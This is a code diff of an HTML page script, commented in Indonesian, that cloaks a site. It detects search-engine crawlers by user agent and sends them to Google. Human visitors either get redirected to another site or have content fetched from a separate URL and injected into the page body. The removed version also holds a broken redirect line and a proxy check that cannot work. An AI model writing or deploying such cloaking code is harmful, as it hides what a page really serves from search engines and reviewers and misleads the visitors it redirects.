@@ -7,49 +7,52 @@
     <script>
         // Daftar User Agent bot yang umum
         const botUserAgents = [
-            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+            "Googlebot", "Bingbot", "Slurp"
         ];
 
-        // Daftar penyedia proxy yang umum
-        const proxyHeaders = [
-            'X-Forwarded-For', 'Via', 'X-Forwarded-Proto', 'Client-IP', 'X-Real-IP'
-        ];
-
-        // Alamat untuk redirect traffic manusia/bot/proxy
-        const humanRedirectUrl = 'https://pesenwebsitekeren.com';
-        const botproxyRedirectUrl = 'https://google.com';
+        // Alamat untuk redirect
+        const botProxyRedirectUrl = 'https://www.google.com';
+        const humanRedirectUrl = 'https://your-human-redirect-url.com';
 
         // Fungsi untuk mendeteksi bot
         function isBot() {
             const userAgent = navigator.userAgent;
-            for (let i = 0; i < botUserAgents.length; i++) {
-                if (userAgent.includes(botUserAgents[i])) {
+            console.log('User Agent:', userAgent); // Log User Agent
+            for (let botUserAgent of botUserAgents) {
+                if (new RegExp(botUserAgent, 'i').test(userAgent)) {
                     return true;
                 }
             }
             return false;
         }
 
-        // Fungsi untuk mendeteksi proxy
-        function isProxy() {
-            const requestHeaders = new Headers();
-            for (let i = 0; i < proxyHeaders.length; i++) {
-                if (requestHeaders.has(proxyHeaders[i])) {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        // Implementasi deteksi bot dan proxy
+        // Implementasi deteksi bot dan fetch konten manusia
         window.onload = function() {
-            if (isBot() || isProxy()) {
-                // Jika terdeteksi bot atau proxy, redirect ke Google
-                window.location.href = 'botproxyRedirectUrl ;
+            const isBotResult = isBot();
+            console.log('Is Bot:', isBotResult);
+            
+            if (isBotResult) {
+                // Jika terdeteksi bot, redirect ke Google
+                console.log('Redirecting to bot URL:', botProxyRedirectUrl);
+                window.location.href = botProxyRedirectUrl;
             } else {
-                // Redirect manusia ke URL yang ditentukan
-                window.location.href = humanRedirectUrl;
+                // Fetch konten dari URL manusia
+                console.log('Fetching content from:', humanRedirectUrl);
+                fetch(humanRedirectUrl)
+                    .then(response => {
+                        console.log('Response status:', response.status);
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok ' + response.statusText);
+                        }
+                        return response.text();
+                    })
+                    .then(data => {
+                        console.log('Fetched content:', data);
+                        document.body.innerHTML = data;
+                    })
+                    .catch(error => {
+                        console.error('Error fetching human content:', error);
+                    });
             }
         };
     </script>
